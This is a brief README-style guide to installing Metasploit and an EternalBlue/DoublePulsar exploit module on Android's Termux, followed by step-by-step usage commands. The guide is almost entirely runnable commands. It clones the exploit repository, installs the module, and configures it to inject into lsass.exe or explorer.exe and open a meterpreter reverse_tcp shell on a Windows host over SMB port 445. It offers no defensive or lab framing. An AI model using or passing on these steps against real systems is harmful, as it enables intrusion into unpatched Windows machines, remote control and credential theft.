## Installing Metasploit and Eternalblue Doublepulsar for Termux
### Commands
```
pkg update && pkg upgrade && pkg install root-repo && termux-setup-storage && pkg install metasploit && pkg install git && cd && git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit && cd Eternalblue-Doublepulsar-Metasploit && cp eternalblue_doublepulsar.rb /data/data/com.termux/files/usr/opt/metasploit-framework/modules/exploits/smb && cd /data/data/com.termux/files/home && mkdir .wine && cd .wine && mkdir drive_c && msfconsole
```
### Usage
* ```use exploits/windows/smb/eternalblue_doublepulsar``` 
* ```set rhost 192.168.0.0```
* ```set lhost 192.168.0.0```
* ```set rport 445```
* ```set lport 4444```
* ```set DOUBLEPULSARPATH /data/data/com.termux/files/home/Eternalblue-Doublepulsar-Metasploit/deps```
* ```set ETERNALBLUEPATH /data/data/com.termux/files/home/Eternalblue-Doublepulsar-Metasploit/deps```
* ```set TARGETARCHITECTURE x86``` / ```x64```
* ```set PROCESSINJECT lsass.exe``` / ```explorer.exe```
* ```set WINEPATH /data/data/com.termux/files/home/.wine/drive_c/```
* ```set PAYLOAD windows/meterpreter/reverse_tcp``` / ```set PAYLOAD windows/x64/meterpreter/reverse_tcp```
* ```exploit```
